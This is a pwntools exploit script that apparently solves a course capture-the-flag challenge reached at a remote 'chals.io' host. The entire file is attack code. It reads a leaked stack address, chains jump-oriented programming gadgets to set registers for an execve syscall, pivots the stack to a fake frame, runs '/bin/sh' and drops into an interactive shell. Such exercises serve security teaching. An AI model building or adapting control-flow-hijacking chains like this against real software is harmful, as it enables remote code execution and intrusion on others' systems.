#!/usr/bin/env python3

from pwn import *

e = context.binary = ELF('./chal.bin')
r = ROP(e)

p = remote("cse4850-jop-1.chals.io", 443, ssl=True, sni="cse4850-jop-1.chals.io")

# Get stack leak
p.recvuntil(b'Stack: ')
stack = int(p.recvline(), 16)
log.success(f"stack @ {hex(stack)}")

# Syscall
syscall  = r.find_gadget(['syscall'])[0]

# Fake stack
fake_stack = stack - 108

# pop RDI
chain = p64(0x40113d)				# pop rbp ; ret

# pointer to /bin/sh
chain += p64(fake_stack + 80)

# set RDI
chain += p64(0x4011dd)                          # mov rdi, rbp ; jmp rdx

# Fix alignment 
chain += b'A' * 16

# set RSI
chain += p64(0x401201)				#  mov rsi, 0 ; jmp rdx

# set RAX
chain += p64(0x4011cd)                          # mov rax, 0x3b ; jmp rdx

# put RDX in RCX
chain += p64(0x4011e9) 				# mov rcx, rdx ; jmp rdx

# set RDX
chain += p64(0x4011f5) 				# xor rdx, rdx ; jmp rcx

# syscall
chain += p64(syscall)

# bin sh
chain += b'/bin/sh\x00'

# fill rest of buffer and overwrite instruction pointer
chain += b'A' * 32

# Dispatcher
chain += p64(0x4011b5)				# pop rsp ; mov rdx, 0x40119d ; jmp rdx

# minor fix
chain += p64(fake_stack - 16)

p.sendline(chain)
p.interactive()
